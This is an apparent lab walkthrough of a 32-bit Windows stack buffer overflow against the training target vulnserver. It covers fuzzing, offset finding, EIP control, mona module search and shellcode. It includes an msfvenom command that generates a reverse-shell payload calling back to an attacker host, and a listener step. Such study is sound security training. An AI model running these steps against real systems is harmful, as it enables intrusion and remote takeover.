## INTRODUCTION TO BUFFER OVERFLOWS


* In this writeup, I will provide a walkthrough of a 32-bit windows buffer overflow
* Topics to cover
	1. Anatomy  of the stack
	2. Fuzzing
	3. Finding the offset 
	4. Overwriting the EIP
	5. Finding the bad characters
	6. Finding the right module
	7. Generating shellcode
	8. Gaining root

# ANATOMY OF THE STACK

* When we look into the memory stack, we will find 4 main components
	1. Extended Stack Pointer (ESP)
	2. Buffer Space
	3. Extender Base Pointer (EBP)
	4. Extended Instruction Pointer (EIP) / Return address

* Buffer space is used as a storage area for memory in some coding languages. With proper input sanitation, information placed into the buffer space should never travel outside of the buffer space itself.
* Information placed into the buffer space should stop at the EBP
* In a buffer overflow, information escapes the buffer space and reaches the EIP. If an attacker can gain control of the EIP, he or she can use the pointer to point malicioud code and gain a reverse shell.

# FUZZING 

* Fuzzing allows us to send bytes of data to a vulnerable program in growing iteration in hopes of overflowing the bufferspace and overwriting the EIP. We can use a simple python fuzzing script
* Attach our debugger to the vulnerable program and observer how all the registers get overwritten. It took approximately 3000 bytes to crash the program
* What we need to do next is to figure out exactly where the EIP is located and attempt to control it.


# FINDING THE OFFSET

* So now that we know we can overwrite the EIP and it occurred between 1 and 3000 bytes, we can use ruby tools caled pattern create and offset to find the exact location of the overwrite. Pattern create allows us to generate a cyclic amount of bytes based no the number of bytes we specify.
* We can send those bytes to vulnserver to find out where exactly we overwrote the EIP. Pattern offset will help us determine that soon.
* ``` pattern_create.rb -l 3000 ``` where l is for length and 3000 is for bytes.
* we modify our code to include all of the bytes that were generated by pattern create.
* We send the bytes to vulnserver and notice we still overwrite the program. This time the EIP value indicates part of  our code we generated with pattern create.
* We can use pattern offset to find out where this pattern occurs
* ``` pattern_offset.rb -l 3000 -q 386F4337  ``` We get a match at 2003 bytes. We can now try to control the EIP

# OVERWRITING THE EIP

* Now that we know the EIP is after 2003 bytes, we can modify our code. We can add 4B's and 2003 A's in an attempt to reach and overwrite the EIP. The EIP is now 42424242. Remember the EIP has a length of 4 bytes so if we overwrite it successfully we will be in full control and on our way to root.
* So now we need to do some research to know what byte characters it is friendly with in order to finalize our exploit 

# FINDING BAD CHARACTERS

* Certain byte characters can cause issues in the development of exploits. We must run every byte through the vulnserver program to see if any characters cause issues. 
* By default, the null byte(x00) is always considered a bad character as it will truncate shellcode when executed. 
* We can add badchars in our code and send it over to vulnserver
* After sending this code, right click on ESP register and select "Follow in Dump"
* Check the hex dump, and if a bad character were present, it would seem out of place. In our case we don't find any

# FINDING THE RIGHT MODULE

* This means we need to find some part of vulnserver that does not have any sort of memory protections such as DEP, ASLR, SEH.
* After copying mona modules to vulnserver we can use it to find a jmp esp opcode that EIP will point to to jump to our malicious shellcode that we will later inject
``` !mona jmp -r esp``` will get us the module to use. Copy the address of the opcode and add it to our python code to overwrite our EIP. 
* The address is entered backwards to conform to little Endian. we can use struct module to pack the bytes in python
* We can set a breakpoint at that address and send the exploit. Immunity should trigger the breakpoint 

# GENERATING THE SHELLCODE

* We can use msfvenom to generate malicious shellcode which will tell the victim machine to talk back to our machine. 
``` msfvenom -p windows/shell_reverse_tcp LHOST=your.Kali.IP.address LPORT=4444 EXITFUNC=thread -f c -a x86 –platform windows -b “\\x00”```

-p is for payload. we are using a non-staged windows reverse shell payload
LHOST is the attacker IP, LPORT the attacker port
EXITFUNC=thread adds stability to our payload
-f is for file type, here we generate a c file type
-a is for architecture, we are attacking a x86
-platform is for OS type- windows machine
-b is for bad characters, our only one is x00

We add this to our exploit. we can also place a NOP padding (x90) to avoid interference with our return address

# GAINING ROOT

* We set up a listener, we can use msfconsole or nc to listen on the port we specified and then send the exploit